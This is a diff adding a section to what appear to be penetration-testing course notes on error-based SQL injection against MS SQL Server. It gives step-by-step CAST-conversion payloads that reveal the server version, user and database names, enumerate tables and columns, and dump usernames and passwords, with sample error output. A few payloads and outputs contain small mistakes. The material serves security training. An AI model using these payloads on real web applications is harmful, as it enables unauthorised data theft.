@@ -593,6 +593,228 @@ We will see how to use specific DBMS features to extract this information later.
 
 ____________________________________________________
 ## 4.4. Exploiting Error-Based SQL Injection
+**Error-based SQL injections** are another way to retrieve data from the database. While they do not ask for data directly, they actually use some advanced DBMS functions to trigger an error. The error message contains the information the penetration tester is aiming for.
+
+Most of the times the error message is reflected on the web application output, but it could also be embedded in an email message or appended to a log file. It depends on how the web application is configured.
+
+Error-based SQL injection is one of the fastest ways to extract data from a database. It is available on DBMSs such as Oracle, PostgreSQL, and MS SQL Server.
+
+Some DBMSs are very generous in terms of information given within error message. In some of the previous examples, we used errors to match conditions of success or failure.
+
+This time, we will retrieve **database names**, **schemas**, and **data** from the errors themselves. We will see some MS SQL Server specific payloads and then introduce some attack vectors for other DBMSs. The basic principle is the same across any DBMS.
+
+#### 4.4.1. MS SQL Server Error-based Exploitation
+**MS SQL Server** reveals the name of database objects within error messages.
+Let us see it in action.
+
+We ported our vulnerable e-commerce application to ASP+MSSQL to show the process of dumping the whole database schema and data manually.
+
+The schemas are databases with the singular purpose of describing all other user-defined databases in the system.
+
+In MSSQL, **sa** is the super admin and has access to the *master* database. The *master* database contains schemas of user-defined databases.
+
+The first piece of information we would like to know is the database version so that we can build our exploits accordingly.
+To do this, we will force the DBMS to show an **error** including the database version.
+
+  One of the most used tricks is to **trigger a type conversion error** that will reveal to us the wanted value.
+
+  From now on we will refer to this scenario:
+  - DBMS is MS SQL Server
+  - The vulnerable app is `ecommerce.asp?id=1`
+  - The id parameter is vulnerable to SQLi
+
+Steps:
+1. **The CAST Technique**
+The injection payload used for this technique is as follows:
+  ```
+  9999999 or 1 in (SELECT TOP 1 CAST(<FIELDNAME> as varchar(4096)) from <TABLENAME> WHERE <FIELDNAME> NOT IN (<LIST>)); --
+  ```
+  This payload is used as input to the vulnerable parameter of the web app: `ecommerce.asp?id=PAYLOAD`.
+
+  We can now dissect the payload to understand all its parts.
+    - *Returning no records* (`9999999`)
+      `9999999` is just a bogus value, you can put anything here, provided that it is not an id present in the database (we want the `OR` part of the SQL query to be executed, so the first condition should be `FALSE`)
+
+    - *Triggering an Error* (`or 1 in`)
+      This is the part of the SQL that will trigger the error.
+      We are asking the database to look for integer value 1 within a `varchar` column
+
+    - *Casting* (`CAST(<FIELDNAME> as varchar(4096))`)
+      This is where we insert the column that we want to dump.
+      (Either a column of a user defined database or a "special" database column).
+      `<FIELDNAME>` can be a SQL function like `user_name()` or a variable like `@@version`
+
+    - *Narrowing down* (`WHERE <FIELDNAME> NOT IN (<LIST>)`)
+      We will use this part in the iterations to dump the database data.
+      This part can be omitted/adjusted at our disposal according to which table our searched fieldname value belongs to.
+
+2.  **Retrieving the SQL Server Version**
+  ```
+  9999999 or 1 in (SELECT TOP 1 CAST(<FIELDNAME> as varchar(4096))) --
+  ```
+  This is a very simple example of how to use this type of payload.
+  We used the `@@version` variable name
+
+  Running this payload on the vulnerable web application makes it print the output:
+    ```
+    [Microsoft][SQL Server Native Client 10.0][SQL Server]Conversion failed when converting the varchar value 'Microsoft SQL Server 2008 R2 (SP2) - 10.50.4000.0 (x64) Jun 28 2012 08:36:30 Copyright (c) Microsoft Corporation Express Edition (64-bit) on Windows NT 6.1 (Build 7601: Service Pack 1) (Hypervisor)' to data type int.
+    ```
+    Thus, printing the DBMS version.
+
+  Knowing the database version is really important because it helps you during the exploitation phase.
+    Example:
+      Different MS SQL Server versions have different default column names in the *master* database.
+
+      We can find information about the structure of the *master* database on [MSDN](https://msdn.microsoft.com/en-us/library/ms187837.aspx)
+
+3. **Dumping the Database Data**
+  In the following section, we will see how to extract information from a database by using error-based SQL injections:
+  - Current database username
+  - Current database name
+  - Installed databases
+  - The tables into a given database
+  - The columns of a given table
+  - Database data
+
+  We can now see how to extract various information via error-based SQL injections by using CAST technique
+
+  In the following examples we will attack a vulnerable web application: http://somesite.xxx/vuln.php?id=1
+
+  The `id` parameter is vulnerable, therefore we will inject our payloads via a web browser.
+
+  Steps:
+  1. Finding the Current Username
+    The first step is to understand the level of privilege we have, by finding the current database user:
+      ```
+      9999 or 1 in (SELECT TOP 1 CAST (user_name() as varchar(4096))) --
+      ```
+      `User_name()` is a MS SQL function which returns the current database user.
+
+      This is the output of the application:
+        ```
+        [Microsoft][SQL Server Native Client 10.0][SQL Server]Conversion failed when converting the varchar value 'user' to data type int.
+        ```
+
+      The current database user is just `user`, so we do not have administrative privileges (as the *sa* would have).
+      We can still dump all the databases to which *user* has access to.
+
+  2. Finding Readable Database
+    So the next step is enumerating the databases that *user* can access.
+    To do that, we will iterate through the *MASTER* database to find all the databases that we can read. The payload is:
+      ```
+      9999 or 1 in (SELECT TOP 1 CAST (db_name(0) as varchar(4096))) --
+      ```
+      The `DB_NAME()` function accesses the *master..sysdatabses* table which stores all the databases installed on the server. We can only see the database that *user* has rights to.
+
+    To enumerate all the databases that *user* can access, we just have to increment the `db_name()` argument:
+      ```
+      9999 or 1 in (SELECT TOP 1 CAST (db_name(1) as varchar(4096))) --
+      ```
+      Cycle trough 1, 2, 3, and continue until we cannot enumerate any more databases.
+
+
+  3. Enumerating Database Tables
+    We now have a list of installed databases and the current database in use.
+
+    This time, we want to **enumerate all the tables in the current database** (the same technique can easily be modified to apply to other databases)
+
+    We will use the following payload scheme:
+      ```
+      9999999 or 1 in (SELECT TOP 1 CAST(name as varchar(4096)) FROM <database name>..sysobjects WHERE xtype='U' and name NOT IN (<known table list>)); --
+      ```
+      Description:
+      - `xtype='U'`
+        Means that we are only interested in user-defined variables
+      - `name NOT IN ('<known table list>')`
+        Name is a column of the `sysobjects` special table. Every time we find a new table we will append it to the NOT IN list. This is needed because the error displays only the first table name.
+
+        Example:
+          If a database contains three tables:
+          - HR
+          - Customers
+          - Products
+          `<known table list>` will:
+          - Be empty in the first payload. `... name NOT IN ('')`  will work!
+          - Contain `HR` at the second step
+          - Contain `HR`, `Customer`, `Products` at the last step
+
+    4. Enumerating Columns
+      After retrieving the tables of a database, it is also possible to recover the columns of each table. This is the *schema* of the database and we can retrieve it by using the following payload template:
+        ```
+        9999 or 1 in (SELECT TOP 1 CAST (<db_name>..syscolumns.name as varchar(4096)) FROM <db_name>..syscolumns,<db_name>..sysobjects WHERE <db_name>..syscolumns.id=<db_name>..sysobjects.id AND  <db_name>..sysobjects.name=<table name> AND <db name>..syscolumns.name NOT IN (<known column list>)); --
+        ```
+        Description:
+        - `<db name>` is the name of the database we are working on
+        - `<table name>` is the name of the table which we are studying
+        - `<known column list>` is a list of the columns we already retrieved
+
+    5. Dumping Data
+      After enumerating the databases and their schemas, we can proceed to the data dumping phase.
+
+      To retrieve the actual content of the database, we need to use the knowledge we obtained of the database structure.
+      We will, again, trigger some errors by using the cast technique.
+
+      You can dump the data by using the same technique we have seen for schema enumeration:
+        ```
+        9999999 or 1 in (SELECT TOP 1 CAST(<column name> as varchar(4096)) FROM <database name>..<table name> WHERE <column name> NOT IN (<retrieved data list>)); -- -
+        ```
+        Let us see a couple of tricks to trigger error depending on the field data type.
+
+        Example:
+          In this example we exploited `page.php?id=1` and identified a table called **users** in the database **cms**.
+          The table contains the following columns:
+          - `id` (int)
+          - `username` (varchar)
+          - `password` (varchar)
+
+          To retrieve the `id` values, you can use the following payload:
+            ```
+            9999999 or 1 in (SELECT TOP 1 CAST(id as varchar)%2bchar(64) FROM cms..users WHERE id NOT IN ('')); -- -
+            ```
+            Please note the concatenation of the `id` value with `@`.
+            This **ensures that the selected id has data type varchar** thus making the cast error possible!
+
+            Sending `%2b` to the web application means sending the `+` character to the DBMS. The `+` character serves as string concatenation command.
+
+              So the resulting error is something like:
+              ```
+              [Microsoft][SQL Server Native Client 10.0][SQL Server]Conversion failed when converting the varchar value '1@' to data type int.
+              ```
+
+          Then we can proceed with the usual method. We filter out the id we already have:
+            ```
+            9999999 or 1 in (SELECT TOP 1 CAST(id as varchar)%2bchar(64) FROM cms..users WHERE id NOT IN ('1')); -- -
+            ```
+
+            So the resulting error is something like:
+            ```
+            [Microsoft][SQL Server Native Client 10.0][SQL Server]Conversion failed when converting the varchar value '1@' to data type int.
+              ```
+
+          After extracting all the ids, we can use this information to extract all the usernames:
+            ```
+            9999999 or 1 in (SELECT TOP 1 CAST(username as varchar) FROM cms..users WHERE id=1); -- -
+            ```
+            No string concatenation is needed here, because *username* data type is varchar. Using the ids, lets us correlate usernames and passwords by retrieving the password of a specific username.
+
+          We can retrieve a password by using pretty much the same payload we used for the username:
+            ```
+            9999999 or 1 in (SELECT TOP 1 CAST(password as varchar) FROM cms..users WHERE id=1); -- -
+            ```
+
+          Or even **concatenate the username and password**:
+            ```
+            9999999 or 1 in (SELECT TOP 1 CAST(username%2bchar(64)password as varchar) FROM cms..users WHERE id=1); -- -
+            ```
+
+In the following video you will see how to manually exploit error-based SQL injections.
+You will see different ways to trigger errors, and some applied payload examples. Moreover, you will see how to submit your payload via the browser and a command line utility.
+
+(see vid-139)
+
+#### 4.4.2. MySQL Error-Based SQLi Exploitation
+
+
 
 
 
